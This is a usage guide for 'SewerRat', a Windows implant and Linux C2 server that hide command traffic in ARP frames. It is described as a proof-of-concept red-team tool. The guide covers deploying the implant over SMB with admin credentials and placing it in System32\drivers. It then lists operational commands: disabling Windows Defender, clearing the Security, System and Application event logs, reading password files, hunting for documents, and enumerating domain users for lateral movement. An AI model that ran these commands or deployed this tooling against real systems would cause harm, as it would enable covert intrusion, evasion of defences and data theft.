# SewerRat Usage Guide

## Quick Start

### 1. Build Binaries

```bash
cd sewerrat/
make all
# Outputs:
#   dist/SewerRat.exe      (Windows implant)
#   dist/sewerrat-server   (Linux C2 server)
```

### 2. Deploy Implant to Target

**Option A: Manual Deployment**
```powershell
# On Windows Server 2022 target:
# 1. Install Npcap: https://nmap.org/npcap/
# 2. Copy SewerRat.exe to C:\Windows\System32\drivers\
# 3. Run: SewerRat.exe
```

**Option B: SMB Deployment (Automated)**
```bash
# On Linux attacker box:
python3 scripts/deploy.py \
    -t 10.0.0.5 \
    -u administrator \
    -p 'P@ssw0rd!' \
    -f dist/SewerRat.exe
```

### 3. Start C2 Server

```bash
# On Linux attacker box:
sudo ./dist/sewerrat-server -i eth0

# Or with custom timeout:
sudo ./dist/sewerrat-server -i eth0 -t 15s
```

### 4. Send Commands

```
sewerrat> broadcast whoami
[>>] Sent command: whoami (to ff:ff:ff:ff:ff:ff)
[*] Waiting for responses (timeout: 10s)...
[<<] 00:11:22:33:44:55: DOMAIN\Administrator

sewerrat> send 00:11:22:33:44:55 ipconfig /all
[>>] Sent command: ipconfig /all (to 00:11:22:33:44:55)
[*] Waiting for response from 00:11:22:33:44:55 (timeout: 10s)...
[<<] 00:11:22:33:44:55: Windows IP Configuration

sewerrat> exit
[*] Exiting...
```

---

## Detailed Usage

### Server Startup

```bash
./dist/sewerrat-server [OPTIONS]
```

**Options:**
- `-i <interface>` — Network interface (default: eth0)
- `-t <duration>` — Response timeout (default: 10s)
  - Format: `5s`, `30s`, `1m`, etc.
- `-h` or `--help` — Show help

**Examples:**
```bash
# Default (eth0, 10s timeout)
sudo ./dist/sewerrat-server

# Custom interface
sudo ./dist/sewerrat-server -i wlan0

# Longer timeout for slow targets
sudo ./dist/sewerrat-server -i eth0 -t 30s

# Fast operations (5s timeout)
sudo ./dist/sewerrat-server -i eth0 -t 5s
```

### Interactive Commands

#### `broadcast <command>`

Sends command to **all implants** on the network.

```
sewerrat> broadcast whoami
[>>] Sent command: whoami (to ff:ff:ff:ff:ff:ff)
[*] Waiting for responses (timeout: 10s)...
[<<] 00:11:22:33:44:55: DOMAIN\Admin
[<<] 00:1A:2B:3C:4D:5E: LOCAL_SYSTEM
```

**Use cases:**
- Network reconnaissance
- Mass execution (all servers at once)
- Privilege escalation testing

#### `send <mac> <command>`

Sends command to **specific MAC address**.

```
sewerrat> send 00:11:22:33:44:55 whoami
[>>] Sent command: whoami (to 00:11:22:33:44:55)
[*] Waiting for response from 00:11:22:33:44:55 (timeout: 10s)...
[<<] 00:11:22:33:44:55: DOMAIN\Administrator
```

**Valid MAC formats:**
- `00:11:22:33:44:55`
- `00-11-22-33-44-55`
- `ff:ff:ff:ff:ff:ff` (broadcast)

#### `help`

Displays command reference.

```
sewerrat> help

SewerRat C2 Server Command Reference:
=====================================

broadcast <command>
  Send command to all active implants on the network.
  Example: broadcast whoami

send <mac> <command>
  Send command to a specific MAC address.
  Example: send 00:11:22:33:44:55 whoami

help
  Display this help message.

exit / quit
  Exit the server.
```

#### `exit` or `quit`

Gracefully closes the C2 server.

```
sewerrat> exit
[*] Exiting...
```

---

## Command Examples

### Information Gathering

```bash
# Get current user
broadcast whoami
broadcast whoami /all

# Get system info
broadcast systeminfo
broadcast wmic os get caption,version,buildnumber

# Get network config
broadcast ipconfig /all
broadcast route print
broadcast arp -a

# Get processes
broadcast tasklist
broadcast tasklist /v
broadcast wmic process list brief

# Get installed software
broadcast wmic product list brief
broadcast reg query HKLM\Software /s

# Get network shares
broadcast net share
broadcast net use
```

### Persistence & Privilege Escalation

```bash
# Check privileges
broadcast whoami /priv

# List scheduled tasks
broadcast schtasks /query /tn "\Microsoft\Windows\*"

# Check UAC status
broadcast reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# List startup programs
broadcast reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Get BootSDK info
broadcast bcdedit
```

### Defense Evasion

```bash
# Disable Windows Defender
broadcast powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

# Clear event logs
broadcast wevtutil cl Security
broadcast wevtutil cl System
broadcast wevtutil cl Application

# Check process execution logging
broadcast reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

### Data Exfiltration (Limited by ARP)

```bash
# Get file content (small files only <4KB)
broadcast powershell -Command "Get-Content C:\passwords.txt"

# List directory
broadcast dir C:\ /s
broadcast dir "C:\Users\Administrator\Documents" /a

# Find sensitive files
broadcast powershell -Command "Get-ChildItem C:\ -Recurse -Include *.pdf,*.doc,*.xlsx 2>$null"
```

### Lateral Movement

```bash
# Check SMB shares on other targets
broadcast net view \\10.0.0.50
broadcast net view \\10.0.0.0 /all

# Get AD info
broadcast net group /domain   # All domain groups
broadcast net user /domain   # All domain users
broadcast whoami /groups     # Current user groups

# Find SMB services
broadcast net share
broadcast wmic logicaldisk get name
```

### Troubleshooting Commands

```bash
# Test network connectivity
broadcast ping 8.8.8.8
broadcast nslookup microsoft.com

# Check firewall
broadcast netsh advfirewall show allprofiles
broadcast netsh firewall show state

# Verify implant execution
broadcast echo IMPLANT_ACTIVE
```

---

## Multi-Command Operations

The server does not support command history or sessions. For complex operations:

### Method 1: Script via PowerShell

```bash
# Send a multi-line PowerShell script encoded in Base64
broadcast powershell -Enc <base64-encoded-script>
```

### Method 2: Staged Execution

```bash
# Step 1: Check if target is accessible
send 00:11:22:33:44:55 whoami

# Step 2: Once confirmed, escalate privileges
send 00:11:22:33:44:55 powershell -Command "if([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544') { Write-Host 'Admin' }"

# Step 3: Execute main payload
send 00:11:22:33:44:55 cmd /c C:\Windows\System32\drivers\SewerRat.exe
```

---

## Output Handling

### Interpreting Response Data

```
Format: [<<] <MAC>: <output>
Example: [<<] 00:11:22:33:44:55: DOMAIN\Administrator
```

### Response Sizes

- **Single frame response** (≤20 bytes): Instant
- **Multi-frame response** (>20 bytes): Arrives in chunks over 2-5 seconds
- **Large response** (>4096 bytes): Output is truncated

```bash
sewerrat> broadcast dir C:\ /s           # Could be large!
[*] Waiting for responses (timeout: 10s)...
[<<] 00:11:22:33:44:55: (Output truncated at 4096 bytes)
```

### Timeout Behavior

```bash
sewerrat> send 00:11:22:33:44:55 powershell -Command "Start-Sleep -Seconds 20; whoami"
[*] Waiting for response from 00:11:22:33:44:55 (timeout: 10s)...
[!] No response received (timeout)   # Command timed out on implant
```

**Solution:** Increase timeout or break into smaller commands.

---

## Advanced Usage

### Broadcast to Specific Subnet

Use a broadcast on specific network segment via ARP routing:

```bash
# Implants reply to any broadcast, even off-subnet
# This works because ARP is not routed (layer 2 only)
broadcast whoami
```

### Timing Attacks (Measure Response Time)

```bash
# Manual one-off testing
send 00:11:22:33:44:55 echo timing_test
# Note response arrival time - helps identify fast/slow targets
```

### Covert Operations

```bash
# Send empty-looking command (fills logs minimally)
broadcast echo.

# Multiple unicast vs broadcast
send 00:11:22:33:44:55 sysinternals_binary
send 00:1A:2B:3C:4D:5E sysinternals_binary
send 00:1A:2B:3C:4D:5F sysinternals_binary
# (Slower but more targeted than broadcast)
```

---

## Troubleshooting

### "Failed to open interface eth0"

```bash
# Check available interfaces
ip link show

# Use correct interface name
sudo ./dist/sewerrat-server -i wlan0

# Or run as root
sudo ./dist/sewerrat-server -i eth0
```

### "No response received (timeout)"

```
Possible causes:
1. Implant not running on target
2. Network segmentation / different VLAN
3. Firewall blocking ARP
4. Implant crashed (check Windows Event Logs)
5. MAC address is wrong

Solutions:
- Verify implant is running: tasklist /include /v | find "SewerRat"
- Check network connectivity: ping target_ip
- Increase timeout: -t 30s
- Verify implant MAC: ipconfig /all on target
```

### "Invalid padding or magic marker not found"

```
This is normal - other ARP traffic won't have the magic marker.
Server silently filters it out.

To debug:
- Use Wireshark to capture ARP traffic on both sides
- Verify magic marker (13 37) appears at byte offset 42
```

### Implant Crashed or Hung

```bash
# On Windows target, check if process is still running:
tasklist | find /i "sewerrat"

# If hung, check network:
- Npcap might be having issues
- Try: ipconfig /flushdns
- Restart implant

# Check Windows Defender is not blocking:
- Defender > Virus & threat protection > Manage
- Add SewerRat to exclusions
```

---

## Performance Tuning

### For Fast, Responsive Operations

```bash
./dist/sewerrat-server -i eth0 -t 5s
```

Faster responses but may timeout on slower targets.

### For Reliable, Slow Operations

```bash
./dist/sewerrat-server -i eth0 -t 30s
```

Better success rate for complex/slow commands.

### For Network-Constrained Environments

Keep commands short:
- ✓ `whoami` (good)
- ✗ `dir C:\ /s /b` (bad - too much output)

---

## Security Notes

**Remember:** This is a **PoC red team tool**. In production:

1. **Encrypt payloads** — Enable XOR cipher (future: AES)
2. **Rotate magic marker** — Change `0x13 0x37` per engagement
3. **Use authentication** — Add HMAC signature to commands
4. **Vary timing** — Randomize beacon intervals more aggressively
5. **Clean up logs** — Clear Windows Event Logs when done

---

For protocol details, see [PROTOCOL.md](PROTOCOL.md).
For development/build info, see [DEVELOPMENT.md](DEVELOPMENT.md).
